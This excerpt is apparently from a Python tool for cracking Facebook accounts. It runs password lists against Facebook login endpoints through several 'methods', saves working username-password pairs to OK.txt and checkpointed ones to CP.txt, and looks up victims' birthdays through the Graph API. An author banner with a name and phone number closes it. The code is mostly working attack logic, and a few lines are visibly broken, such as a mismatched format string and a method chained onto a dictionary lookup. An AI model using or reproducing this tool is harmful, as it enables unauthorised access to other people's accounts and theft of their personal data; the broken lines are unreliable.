...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IMTIAZ_AKING(' [1] ATIF Method 1 ')
			IMTIAZ_AKING(' [2] ATIF Method 2  [ Pro ]')
			IMTIAZ_AKING(' [3] ATIF Methid 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [Atif] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-Atif] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-Atif] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-Atif] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;32m[Successful-Atif] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-Atif] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-Atif] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
\-'_                \-' |||||||||               `-._
 ...
 [*]=============================================
    Author   : Atif Ahmed 
    Facebook : https://facebook.com/AtifAhmedSulaiman
    Team     : Atif & Shahazada 
    Connect  : +8801872934457
 [*]=============================================
